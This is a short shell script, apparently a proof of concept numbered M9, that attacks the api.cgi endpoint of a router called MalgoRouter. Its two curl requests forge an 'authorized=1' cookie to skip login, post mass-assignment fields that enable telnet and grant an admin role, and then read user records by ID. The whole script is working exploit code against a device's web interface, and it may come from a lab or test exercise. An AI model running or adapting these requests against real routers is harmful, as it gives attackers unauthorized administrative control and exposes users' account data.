#!/bin/sh
# M9 - api.cgi: legacy-admin bypass (authorized=1) + mass assignment.
: "${TARGET:?set TARGET to the MalgoRouter IP}"
echo "[*] authenticated as legacy_admin via cookie, toggling telnet (mass assignment)"
curl -s --max-time 15 -X POST -H 'Cookie: authorized=1' \
     -d '_enable_telnet_=true&_role_=_admin_&_admin_override=true' \
     "http://$TARGET/cgi-bin/api.cgi?action=config"
echo
echo "[*] user enumeration / BOLA via same bypass"
curl -s --max-time 15 -H 'Cookie: authorized=1' \
     "http://$TARGET/cgi-bin/api.cgi?action=user&id=1"
echo
